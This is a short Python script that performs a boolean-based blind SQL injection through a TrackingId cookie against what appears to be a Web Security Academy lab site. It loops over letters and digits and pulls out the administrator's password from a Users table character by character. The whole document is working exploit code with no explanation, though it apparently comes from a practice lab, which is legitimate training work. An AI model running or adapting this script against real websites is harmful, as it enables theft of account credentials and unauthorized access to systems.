import requests, string

quess = ''

url = 'https://0a2500ca03c7953782e5484c008b00fa.web-security-academy.net/'
chars = string.ascii_lowercase + string.digits

searching = True

position = 1

while searching:
        for char in chars:
            headers = {'Cookie': f'TrackingId=SH8k8rVMlGcKoz4X\' AND SUBSTRING((SELECT Password FROM Users WHERE Username = \'administrator\'), {position}, 1) = \'{char}; session=v4zAynCFSexzpegF8lmtlOaDn7jF8rT4\''}
            response = requests.get(url,headers=headers)

            if 'Welcome back!' in response.text:
                quess += char
                position += 1
                print("Current password: " + quess)
                break
        else:
            print("No more valid characters found")
            exit(1)